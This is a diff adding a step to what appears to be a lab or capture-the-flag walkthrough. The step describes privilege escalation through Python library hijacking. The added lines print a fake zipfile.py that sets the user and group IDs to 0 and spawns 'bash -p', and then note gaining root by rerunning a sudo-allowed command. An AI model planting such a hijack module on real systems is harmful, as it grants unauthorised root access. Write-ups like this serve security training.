@@ -120,6 +120,22 @@ import os
 import zipfile
 ```
 
+- I created a `zipfile.py` in the directory and added this piece of code below.
+
+```python3
+import os
+os.setuid(0);os.setgid(0);os.system("bash -p")
+```
+
+- I ran the `sudoers rule ` command again to gain root
+
+![image](https://github.com/user-attachments/assets/4e4ccf64-b176-480f-a8a1-13e12c19ad31)
+
+- Root!!!!
+
+
+
+
 
 
 
